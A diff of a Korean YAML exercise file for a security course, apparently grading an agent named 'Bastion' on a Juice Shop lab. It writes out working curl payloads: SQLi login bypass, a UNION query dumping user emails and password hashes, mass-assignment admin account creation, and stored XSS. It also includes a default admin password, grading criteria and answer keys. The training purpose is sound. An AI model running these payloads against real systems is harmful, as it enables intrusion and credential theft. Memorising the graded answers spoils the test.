@@ -150,7 +150,9 @@ steps:
     지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
   verify:
     type: output_contains
-    expect: email
+    expect:
+    - email
+    - admin
     field: stdout
     semantic:
       intent: JuiceShop /api/Users Mass Assignment — 등록 body 에 role:admin 필드 추가해 관리자
@@ -239,7 +241,9 @@ steps:
     XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
   verify:
     type: output_contains
-    expect: comment
+    expect:
+    - comment
+    - XSS
     field: stdout
     semantic:
       intent: JuiceShop /api/Feedbacks 저장형 XSS — 로그인 후 comment 필드에 <script>alert(1)</script>
@@ -690,60 +694,106 @@ steps:
   bastion_prompt: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에
     정리해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "Exploitation chain — SQLi 인증 우회 + UNION DB 추출 + Mass Assignment 권한 상승"
 
-    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1--
-    페이로드를 사용하여 관리자로 로그인해줘
+    ## 상황 (w03 → w04 시나리오 연속)
 
-    2) 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
+    > 선임: "정찰 끝났으면 익스플로잇. 한 취약점만 쓰면 의미 없어 — *chain* 이 진짜야.
+    > SQLi 로 admin JWT 획득 → UNION 으로 DB 스키마 추출 → Mass Assignment 로 새 admin 계정 생성.
+    > MITRE ATT&CK 매핑까지 해서 보고서 차별화."
 
-    3) JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src=''javascript:alert(1)''>
-    페이로드를 사용해줘
+    학습 목표 (lecture #2·#3·#4 SQLi 4 유형 + JuiceShop 실 공격 + sqlmap) + (lab #1·#5·#4 SQLi auth/UNION/Mass) 통합.
 
-    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment
-    취약점을 공략해줘
+    ## 임무 (3 단계, 약 35분)
 
-    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스
-    테이블 정보를 추출해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ### Phase A — SQLi 인증 우회 + JWT 분석 (lab #1·#2)
+    1) `curl -s -X POST -H "Content-Type: application/json"
+        -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"x"}' http://10.20.30.80:3000/rest/user/login`
+       응답에서 JWT 캡처 (또는 차단 응답).
+    2) JWT decode: `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` 로 admin role 확인.
+
+    ### Phase B — UNION SQLi DB 추출 + Mass Assignment (lab #5·#4)
+    1) UNION:
+       `curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,createdAt,updatedAt,deletedAt%20FROM%20Users--" | head -c 500`
+       응답에서 사용자 이메일·해시 추출 (또는 차단 응답).
+    2) Mass Assignment:
+       `curl -s -i -X POST -H "Content-Type: application/json"
+        -d '{"email":"chain'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}'
+        http://10.20.30.80:3000/api/Users/`
+       응답 status + 등록 결과 캡처.
+
+    ### Phase C — ATT&CK Initial Access + Privilege Escalation 매트릭스
+    | ATT&CK 기법 | 단계 | 사용 페이로드 | 결과 |
+    | T1190 Exploit Public-Facing | Initial Access | ' OR 1=1-- | admin JWT 또는 차단 |
+    | T1078 Valid Accounts | Initial Access | UNION → email/hash 추출 | 자격증명 풀 확보 |
+    | T1068 Exploitation for Priv Esc | Privilege Escalation | __proto__ / role:admin | admin 계정 등록 시도 |
+    | T1136 Create Account | Persistence | mass assignment | 백도어 계정 |
+    | T1213 Data from Information Repositories | Collection | UNION DB 추출 | 사용자 N명 dump |
+    표 끝 "다음 주차 (w05) 입력: 획득한 admin JWT → 권한 상승 후 횡적 이동 (lateral movement) 단계." 한 줄.
+
+    종료: echo "=== Phase A SQLi+JWT ===" / "=== Phase B UNION+Mass ===" / "=== Phase C ATT&CK ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w04 Exploitation chain]
+
+    JuiceShop SQLi 인증 우회 + UNION + Mass Assignment + ATT&CK 매트릭스 3 phase.
+
+    Phase A:
+    `curl -s -X POST -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}" http://10.20.30.80:3000/rest/user/login | head -c 500`
+    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authentication',{}).get('token',''))" 2>/dev/null)`
+    `echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
+
+    Phase B:
+    `curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,createdAt,updatedAt,deletedAt%20FROM%20Users--" | head -c 500`
+    `curl -s -i -X POST -H "Content-Type: application/json" -d '{"email":"chain'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}' http://10.20.30.80:3000/api/Users/ | head -20`
+
+    Phase C (ATT&CK 매트릭스):
+    ```
+    | ATT&CK | 단계 | 페이로드 | 결과 |
+    | T1190 Exploit Public-Facing | Initial Access | ' OR 1=1-- | admin JWT/차단 |
+    | T1078 Valid Accounts | Initial Access | UNION → email/hash | 자격증명 |
+    | T1068 Exploit Priv Esc | Privilege Escalation | role:admin | admin 등록 |
+    | T1136 Create Account | Persistence | mass assignment | 백도어 |
+    | T1213 Data from Repositories | Collection | UNION DB | 사용자 dump |
+    ```
+    표 끝 "w05 입력: 획득한 admin JWT → 횡적 이동 단계." 한 줄.
+
+    종료: echo "=== Phase A SQLi+JWT ===" / "=== Phase B UNION+Mass ===" / "=== Phase C ATT&CK ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: ' OR 1=1-- 차단되면 admin/admin123 로 정상 로그인 후 JWT 분석.
+    Phase B: UNION 7 컬럼 (Users 테이블 컬럼 수). Mass Assignment 차단되는 게 정상.
+    Phase C: 5행 ATT&CK + w05 입력.
+    포인트: 단일 취약점 → chain 으로 권한 상승.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: ATT&CK
     field: stdout
     semantic:
-      intent: '[통합] 웹 애플리케이션 5작업 — SQLi/XSS/CSRF/dir brute/audit 통합. OWASP Top 10.'
+      intent: |
+        SQLi 인증 우회 + JWT 분석 + UNION DB 추출 + Mass Assignment + ATT&CK Initial Access·Priv Esc 매트릭스.
+        lecture #2·#3·#4 + lab #1·#2·#4·#5 동시 행동 증명.
       success_criteria:
-      - 5 웹 작업
-      - payload 성공
-      - 취약점 3+
+      - Phase A — SQLi auth 시도 + admin 정상 로그인 + JWT decode
+      - Phase B — UNION 7컬럼 + Mass Assignment POST
+      - Phase C — 5행 ATT&CK 매트릭스 + w05 입력
       acceptable_methods:
-      - bastion plan
-      - sqlmap + Burp
-      - ffuf
+      - curl + python3 base64
+      - UNION SELECT 7 컬럼
+      - JSON __proto__ / role:admin
+      - markdown table T-id
       negative_signs:
-      - payload 실패
-      - 단일 취약점
-      - audit 누락
+      - SQLi 한 케이스만
+      - JWT 분석 누락
+      - 매트릭스 누락
+      - chain 관점 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1--
-    페이로드를 사용하여 관리자로 로그인해줘
-
-    2) 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
-
-    3) JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src=''javascript:alert(1)''>
-    페이로드를 사용해줘
-
-    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment
-    취약점을 공략해줘
-
-    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스
-    테이블 정보를 추출해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. SQLi → UNION+Mass → ATT&CK.
+  answer_detail: |
+    JuiceShop 차단 정책에 따라 응답 다름. 시도 자체와 응답 코드 분석이 학습. UNION 컬럼 수는 Users 테이블 7개.
   script: ''
